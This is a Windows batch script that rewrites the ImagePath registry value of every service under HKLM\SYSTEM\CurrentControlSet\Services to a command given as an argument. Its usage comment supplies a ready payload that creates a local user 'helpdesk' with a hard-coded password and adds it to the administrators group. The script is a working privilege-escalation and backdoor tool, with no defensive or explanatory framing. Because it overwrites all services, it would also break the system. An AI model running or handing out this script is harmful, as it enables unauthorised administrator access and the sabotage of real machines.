@echo off
:: Batch script to modify the ImagePath value for all services under the "Services" registry key.
:: Usage: ModifyServiceImagePath.bat "<new_image_path>"
:: Usage: ModifyServiceImagePath.bat "cmd.exe /c net user helpdesk L3tm3!n /add ^&^& net localgroup administrators helpdesk /add"

:: Enable delayed variable expansion to use variables within loops
setlocal enabledelayedexpansion

:: Check if a new image path was passed as an argument
if "%~1"=="" (
    echo Usage: %0 "<new_image_path>"
    endlocal
    exit /b 1
)

:: Store the provided argument (new ImagePath) in a variable
set "newImagePath=%~1"

:: Path to the Services registry key
set "servicesPath=HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services"

:: Get the list of service names under the Services registry key
for /f "tokens=*" %%A in ('reg query "%servicesPath%"') do (
    set "serviceName=%%A"
    
    :: Skip the root key itself
    if "!serviceName!" neq "%servicesPath%" (
        :: Extract the short service name from the full registry path
        set "shortServiceName=!serviceName:%servicesPath%\=!"

        :: Attempt to modify the ImagePath value with the new image path
        reg add "%servicesPath%\!shortServiceName!" /t REG_EXPAND_SZ /v ImagePath /d "%newImagePath%" /f >nul 2>&1
        
        :: Check if the registry modification was successful
        if !errorlevel! equ 0 (
            echo Successfully modified ImagePath for service: !shortServiceName!
        ) else (
            echo Failed to modify ImagePath for service: !shortServiceName!
        )
    )
)

:: End the script, restore original environment settings
endlocal
exit /b 0
